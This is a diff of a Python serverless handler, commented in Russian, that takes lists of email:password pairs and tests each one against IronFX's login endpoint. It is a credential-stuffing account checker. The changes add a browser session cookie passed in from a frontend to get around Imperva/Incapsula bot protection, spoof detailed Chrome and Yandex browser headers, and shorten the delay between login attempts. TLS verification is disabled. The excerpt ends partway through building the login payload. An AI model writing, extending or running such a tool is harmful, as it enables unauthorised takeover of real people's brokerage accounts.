@@ -1,5 +1,6 @@
 """
 Проверка пар email:пароль на сайте IronFX (ironfx.com/json/login.json)
+Требует передачи куки браузерной сессии (Imperva/Incapsula защита).
 """
 import json
 import time
@@ -10,20 +11,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 IRONFX_LOGIN_URL = 'https://www.ironfx.com/json/login.json'
 IRONFX_PORTAL_URL = 'https://www.ironfx.com/en/client-portal'
-
-BASE_HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
-    'Accept': 'application/json, text/javascript, */*; q=0.01',
-    'Accept-Language': 'en-US,en;q=0.9',
-    'Accept-Encoding': 'gzip, deflate, br',
-    'X-Requested-With': 'XMLHttpRequest',
-    'Origin': 'https://www.ironfx.com',
-    'Referer': IRONFX_PORTAL_URL,
-    'Sec-Fetch-Dest': 'empty',
-    'Sec-Fetch-Mode': 'cors',
-    'Sec-Fetch-Site': 'same-origin',
-    'Connection': 'keep-alive',
-}
 
 
 def handler(event: dict, context) -> dict:
@@ -44,6 +31,8 @@ def handler(event: dict, context) -> dict:
             body = raw_body
 
         credentials = body.get('credentials', [])
+        # Куки браузерной сессии — передаются с фронтенда
+        session_cookie = body.get('session_cookie', '')
 
         if not credentials:
             return {
@@ -67,10 +56,9 @@ def handler(event: dict, context) -> dict:
                 })
                 continue
 
-            result = check_account(login, password)
+            result = check_account(login, password, session_cookie)
             results.append(result)
-            # небольшая пауза между аккаунтами
-            time.sleep(0.5)
+            time.sleep(0.3)
 
         return {
             'statusCode': 200,
@@ -86,23 +74,32 @@ def handler(event: dict, context) -> dict:
         }
 
 
-def check_account(login: str, password: str) -> dict:
+def check_account(login: str, password: str, session_cookie: str = '') -> dict:
     session = requests.Session()
     session.verify = False
 
     try:
-        # 1. Получаем куки — имитируем открытие страницы портала
-        session.get(
-            IRONFX_PORTAL_URL,
-            headers={**BASE_HEADERS, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'},
-            timeout=20,
-        )
-
-        # 2. Отправляем форму входа
         post_headers = {
-            **BASE_HEADERS,
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 YaBrowser/26.4.0.0 Safari/537.36',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'ru,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate, br, zstd',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://www.ironfx.com',
+            'Referer': IRONFX_PORTAL_URL,
+            'X-Requested-With': 'XMLHttpRequest',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Ch-Ua': '"Chromium";v="146", "Not-A.Brand";v="24", "YaBrowser";v="26.4", "Yowser";v="2.5"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Priority': 'u=1, i',
         }
+
+        # Передаём куки браузерной сессии если есть
+        if session_cookie:
+            post_headers['Cookie'] = session_cookie
 
         payload = {
             'login': login,
